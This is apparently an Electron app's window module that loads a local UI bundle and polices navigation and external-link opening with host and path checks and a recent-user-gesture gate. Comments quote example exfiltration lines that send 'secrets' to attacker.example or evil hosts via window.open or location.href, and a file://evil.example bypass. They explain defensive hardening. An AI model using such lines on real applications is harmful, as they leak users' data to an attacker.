// The BUNDLED UI window (docs/DESKTOP-MIGRATION-PLAN.md Phase 2).
//
// This is the window that replaces `loadURL('https://www.usedopl.com/canvas')`.
// It renders `renderer/app/` — the Vite build of `apps/desktop-ui` — as a LOCAL
// page, and gets the typed data bridge (`renderer/app-preload.js` +
// `main/ui-bridge.js`).
// ⚠ THE SENTENCE THIS REPLACES DESCRIBED A TREE THAT NO LONGER EXISTS (corrected 2026-08-20):
// it said "today's main window hosts REMOTE content and therefore gets the deliberately-minimal
// `renderer/preload.js` bridge", contrasting this window with the remote shell. That shell and
// its preload are DELETED — `test/preload-parity.test.mjs` asserts `renderer/preload.js` is
// absent — so there is no second window and no second bridge to contrast with. This IS the
// window.
//
// The security shape is the DELETED `main/session-window.js`'s, verbatim, because that is
// the repo's proven pattern for a local Electron page:
//   • contextIsolation + sandbox + nodeIntegration:false, one dedicated preload
//     as the ENTIRE privileged surface;
//   • `loadFile` in production — never a remote URL;
//   • every `window.open` denied, every navigation off the loaded page blocked;
//   • a page CSP (`default-src 'none'`, no `connect-src`) shipped in the built
//     index.html by the SPA's own build — see apps/desktop-ui/vite.config.ts.
//     The renderer never touches the network; main does, behind IPC.
//
// NOT WIRED YET. index.js still creates the remote main window; see
// dopl-desktop-app/WIRING.md for the two-line integration.

const path = require('path');
const { app, BrowserWindow, shell } = require('electron');
// The OS-opener policy, shared with main/ui-bridge.js's `dopl:open-external`.
const externalUrl = require('./external-url');
const { diag } = require('./diag');

const INDEX_HTML = path.join(__dirname, '../renderer/app/index.html');
const PRELOAD = path.join(__dirname, '../renderer/app-preload.js');

// ─── BEGIN SPA-WINDOW-PURE (navigation policy; unit-testable via source extraction) ──
//
// The ONE question this window asks about a URL: may the renderer navigate the
// top frame there? Production answers "only the file: page we loaded"; dev adds
// the Vite origin (HMR reloads the page on some edits). Everything else — a
// link to usedopl.com, an OAuth redirect, an attacker-controlled href — is
// refused here and, if it is a legitimate outbound link, goes through
// `window.dopl.openExternal` into the system browser instead.
//
// `devUrl` is the resolved DOPL_UI_DEV_URL ('' in production); `indexHref` is
// the pathToFileURL href of the ONE local document this window may show. A
// bare `file://` prefix test would admit ANY local document — which inherits
// the window.dopl bridge and (CSP being a per-document <meta>) carries no CSP
// — so the file: comparison is exact on the HOST AND the path, ignoring
// query/hash.
//
// ⚠ THE HOST CONJUNCT IS LOAD-BEARING AND WAS MISSING UNTIL 2026-08-18 (wave-2
// fix pass); the comment said "exact on the path" and meant it. A `file:` URL
// has an AUTHORITY component, so `file://evil.example/…/index.html` parses with
// the SAME pathname as the real page and passed. `pathToFileURL` produces an
// empty host on every platform this app ships to, so the check is exact
// equality against `allowed.host` rather than an allowlist — whatever the real
// index href's host is, that is the only one admitted, and a UNC-style remote
// authority can never match a local one.
//
// Parsing is defensive: a URL we cannot parse is refused, never waved through.
function isAllowedNavigation(url, devUrl, indexHref) {
  const target = String(url || '');
  if (target.startsWith('file:')) {
    if (!indexHref) return false;
    try {
      const t = new URL(target);
      const allowed = new URL(indexHref);
      return (
        t.protocol === 'file:' &&
        t.host === allowed.host &&
        t.pathname === allowed.pathname
      );
    } catch (_err) {
      return false;
    }
  }
  if (!devUrl) return false;
  try {
    return new URL(target).origin === new URL(devUrl).origin;
  } catch (_err) {
    return false;
  }
}
// ─── END SPA-WINDOW-PURE ─────────────────────────────────────────────────────

// Dev serves the Vite dev server (HMR, no rebuild); production loads the file.
// Resolved per call, not at require time, so a test or a relaunch sees the
// current env.
function devUrl() {
  return process.env.DOPL_UI_DEV_URL || '';
}

// TRUE when macOS launched us as a hidden login item (`openAsHidden`). It lived in
// index.js and was read by the deleted `createMainWindow`; the collapse to one factory
// left it there with no caller, so the app went on REGISTERING itself as a hidden login
// item (`index.js` setLoginItemSettings) while nothing honoured the flag. Moved here
// because this is now the only place a main window decides whether to reveal itself.
function wasOpenedHidden() {
  try {
    return process.platform === 'darwin' && !!app.getLoginItemSettings().wasOpenedAsHidden;
  } catch (_) {
    return false;
  }
}

// THE PRELOAD + SANDBOX SHAPE EVERY APP-OWNED SPA WINDOW GETS, as one function.
//
// ⚠ SHARED WITH THE POP-OUT (main/popout-window.js, wiring plan Phase 10). The pop-out
// takes the SAME preload deliberately: it is an app window rendering the same bundle, and
// what AUTHORIZES it is main/app-windows.js's registry, not a second, narrower bridge. A
// pop-out with its own preload would be the "build the thread view twice" outcome Samuel's
// ruling rejected — and a narrowed one would silently break every privileged call the
// thread view already makes. ⚠ A window built with these preferences MUST also take
// `policeNavigation` below and MUST be registered in `app-windows.js`; the three go
// together, and `test/popout-window.test.mjs` pins that they do.
function spaWebPreferences() {
  return {
    // The renderer's document origin is file:// — user-facing URLs (MCP
    // endpoints, join links) must come from the REAL app origin, passed
    // as a preload constant, never derived from the document.
    additionalArguments: [`--dopl-app-origin=${require('./config').APP_ORIGIN}`],
    preload: PRELOAD,
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    spellcheck: true,
  };
}

// ─── BEGIN SPA-WINDOW-GESTURE (policy; unit-testable via source extraction) ──
//
// ⚠ THE OS OPENER IS NOT A FREE FUNCTION THE RENDERER MAY CALL (added 2026-10-11, release
// review). The #3031 hand-off below bounded `window.open` by SCHEME alone, so a SCRIPT — not a
// person — could call `window.open('https://attacker.example/?' + secrets)` and reach the user's
// real browser carrying an arbitrary query string. That is an OUTBOUND channel out of a document
// whose CSP is `default-src 'none'` with no `connect-src` at all, and it is the same hole
// `avatar-policy.js` still cites as the reason its own gate stays HOST-based. The mitigations
// that make the precondition hard to reach (`script-src 'self'`, no `dangerouslySetInnerHTML`
// on the markdown path) are OTHER modules' invariants; the bound belongs here.
//
// So the hand-off asks TWO questions, and `main/external-url.js` stays the ONE allowlist:
//   1. did a PERSON just act in this window?   (here)
//   2. is the scheme one a link may use?       (external-url.js, shared with `dopl:open-external`)
//
// 5 seconds is Chromium's own transient-user-activation window, deliberately: a click or a
// keypress authorizes the open that follows it and nothing later. `mouseMove`, `mouseEnter`,
// `mouseWheel` and scroll gestures are NOT activation — a pointer crossing a transcript is not
// consent to open a browser — so the set is positive and short.
const GESTURE_WINDOW_MS = 5000;
const ACTIVATING_INPUT = Object.freeze([
  'mouseDown', 'mouseUp', 'keyDown', 'rawKeyDown', 'keyUp', 'char',
  'touchStart', 'touchEnd', 'gestureTap',
]);
function isActivatingInput(type) {
  return ACTIVATING_INPUT.includes(String(type == null ? '' : type));
}
// A gesture we never saw, one from the future (a clock step) and one older than the window are
// all "no". Fails CLOSED on anything non-finite rather than treating NaN arithmetic as fresh.
function gestureIsFresh(lastAt, now) {
  if (!Number.isFinite(lastAt) || !Number.isFinite(now)) return false;
  const age = now - lastAt;
  return age >= 0 && age <= GESTURE_WINDOW_MS;
}
// ─── END SPA-WINDOW-GESTURE ──────────────────────────────────────────────────

// The last activating input per webContents. A WeakMap, so a closed window's entry goes with it
// and nothing here keeps a destroyed webContents alive.
const lastGestureAt = new WeakMap();

// Armed by `policeNavigation`, so a window that gets the hand-off always gets the gesture source
// too — the two cannot be wired separately and drift.
function armGestureTracking(wc) {
  if (!wc || typeof wc.on !== 'function') return;
  wc.on('input-event', (_event, input) => {
    if (isActivatingInput(input && input.type)) lastGestureAt.set(wc, Date.now());
  });
}

// ⚠ NO webContents => NO OPEN. A caller that cannot say which window acted cannot prove a person
// did, and the refusal costs nothing: every real caller has one.
function hasRecentUserGesture(wc) {
  if (!wc) return false;
  return gestureIsFresh(lastGestureAt.get(wc), Date.now());
}

// REFUSING A NAVIGATION IS HALF AN ANSWER; THE OTHER HALF IS THE BROWSER.
//
// ⚠ THIS IS THE FIX FOR #3031 — "links across the app don't open" (2026-10-10). The refusals
// below were complete and silent: `window.open` denied, `will-navigate` preventDefault'd, and
// nothing more. So a plain `<a href="https://…">`, an `<a target="_blank">`, a link inside a
// rendered markdown message, an ontology Link field, a link in a knowledge entry — every link
// the renderer did NOT hand to `window.dopl.openExternal` by hand — was swallowed here and
// never reached the bridge at all. No renderer-side change could have fixed that, which is why
// the fix is ONE main-process hand-off rather than an onClick on every anchor: a link kind
// nobody has written yet is already covered.
//
// What the hand-off does NOT loosen: the navigation predicate is untouched, so the top frame
// still cannot LEAVE the bundled document — the URL goes to the OS browser instead of into
// this window. Scheme policy is `main/external-url.js` (http/https/mailto; `file:`,
// `javascript:`, `data:` and the rest stay refused), shared with `dopl:open-external` so the
// two cannot drift.
//
// ⚠ TWO GATES SINCE 2026-10-11, and `wc` is not optional (see SPA-WINDOW-GESTURE above). The
// gesture is asked FIRST so a scriptable URL never even reaches the scheme test's log line.
function handOffExternal(url, why, wc) {
  if (!hasRecentUserGesture(wc)) {
    // ⚠ The HOST, never the URL — a scripted open's query string is the payload.
    diag(`spa-window: ${why} refused, no user gesture —`, externalUrl.externalUrlHost(url));
    return false;
  }
  if (!externalUrl.isOpenableExternalUrl(url)) {
    // ⚠ The HOST, never the URL — a blocked navigation's query string is untrusted content.
    diag(`spa-window: ${why} refused, not openable —`, externalUrl.externalUrlHost(url));
    return false;
  }
  // Fire-and-forget: a failed OS opener must not reject into an Electron event handler.
  Promise.resolve()
    .then(() => shell.openExternal(String(url).trim()))
    .catch((err) => diag('spa-window: openExternal failed —', (err && err.message) || 'error'));
  return true;
}

// Deny every `window.open`, and police EVERY top-frame steering primitive with the one
// predicate above: direct navigation, server-issued redirects, and subframe navigations
// (frames are frame-src 'none' in the built CSP, but dev loadURL carries no CSP).
// ⚠ HASH navigation is not a navigation event, which is why the SPA's hash router routes
// freely inside a window this locks down — and why a pop-out can be LANDED on a route by
// loading the index with a hash rather than by being handed a URL.
function policeNavigation(win) {
  // The gesture source for the hand-off's first gate. Armed before the handlers that read it.
  armGestureTracking(win.webContents);
  // `target="_blank"` and `window.open` arrive here. The window is still DENIED — what is new
  // is that the URL it wanted is handed to the real browser instead of dropped, and only when a
  // person just acted (`HandlerDetails` carries no activation flag, so the window tracks input).
  win.webContents.setWindowOpenHandler((details) => {
    handOffExternal(details && details.url, 'window.open', win.webContents);
    return { action: 'deny' };
  });
  const indexHref = require('node:url').pathToFileURL(INDEX_HTML).href;
  const police = (event, url) => {
    if (isAllowedNavigation(url, devUrl(), indexHref)) return;
    event.preventDefault();
    // ⚠ GATED THE SAME WAY, on purpose. `location.href = 'https://evil/?' + secrets` is the
    // same exfiltration leg as a scripted `window.open`, and it arrives here instead.
    handOffExternal(url, 'navigation', win.webContents);
  };
  win.webContents.on('will-navigate', police);
  win.webContents.on('will-redirect', police);
  win.webContents.on('will-frame-navigate', (event) => {
    // Only the main frame may navigate at all; any subframe navigation is
    // refused outright.
    if (!event.isMainFrame) { event.preventDefault(); return; }
    // ⚠ REFUSE WITHOUT HANDING OFF, and that asymmetry is deliberate. Electron fires BOTH
    // `will-navigate` and `will-frame-navigate` for one main-frame navigation, so handing off
    // in both opens the destination TWICE — two browser tabs per clicked link. `will-navigate`
    // above owns the hand-off; this listener stays what it has always been, the frame guard.
    //
    // ⚠ AND IT RE-ASKS THE PREDICATE ON PURPOSE (release review 2026-10-11 raised this as a
    // redundancy; KEPT). `police` answers the same question for the same navigation, so on the
    // ordinary path this call's answer is already known — but the two events are emitted
    // independently and `will-navigate` is documented not to fire for every navigation
    // `will-frame-navigate` sees. Deleting the second evaluation trades a free URL parse for a
    // leg that would then be refused by nothing, which is the wrong side of that trade. The
    // duplication is the belt; it is not leftover.
    if (!isAllowedNavigation(event.url, devUrl(), indexHref)) event.preventDefault();
  });
  return win;
}

// `opts.show === true` FORCES the window visible once painted even on a hidden login
// launch — an explicit open (tray, notification click, deep link) must always surface it.
// Anything else defers to `wasOpenedHidden()`, which is what makes a background-listener
// start actually stay in the tray.
function createSpaWindow(opts = {}) {
  const dev = devUrl();

  const win = new BrowserWindow({
    width: 1280,
    height: 820,
    minWidth: 960,
    minHeight: 640,
    title: 'Dopl',
    // --bg-base from the design tokens, so the first paint is not white flash.
    backgroundColor: '#f5f7fa',
    show: false,
    webPreferences: spaWebPreferences(),
  });

  if (dev) {
    win.loadURL(dev);
  } else {
    win.loadFile(INDEX_HTML);
  }
  // NOT unconditional. This showed on every paint, which made `createShellWindow`'s
  // `show:false` inert and stole focus on every login for a user who had ticked "Hide".
  const forceShow = opts.show === true;
  win.once('ready-to-show', () => { if (forceShow || !wasOpenedHidden()) win.show(); });

  // Defense in depth on top of the page CSP. This window is never a browser.
  policeNavigation(win);

  return win;
}

module.exports = {
  createSpaWindow,
  isAllowedNavigation,
  wasOpenedHidden,
  spaWebPreferences,
  policeNavigation,
  handOffExternal,
  armGestureTracking,
  hasRecentUserGesture,
  isActivatingInput,
  gestureIsFresh,
  GESTURE_WINDOW_MS,
  devUrl,
  INDEX_HTML,
};
